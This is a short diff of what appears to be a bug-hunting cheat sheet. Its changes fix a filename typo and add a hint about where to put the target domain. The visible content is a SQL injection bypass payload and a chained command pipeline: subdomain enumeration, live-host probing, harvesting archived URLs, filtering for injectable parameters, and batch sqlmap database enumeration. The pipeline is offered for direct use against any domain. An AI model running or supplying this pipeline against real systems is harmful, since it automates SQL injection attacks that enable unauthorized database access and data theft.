@@ -8,8 +8,8 @@
  ' or ''=' 
 
  ///
- subfinder -d target | tee -a domains
- cat domain | httpx | tee -a alive.txt
+ subfinder -d target | tee -a domains (change target with your domain eg: sample.com)
+ cat domains | httpx | tee -a alive.txt 
  cat alive.txt | waybackurls | tee -a urls 
  gf sqli urls >> sqli
  python3 sqlmap.py -m sqli --dbs --batch
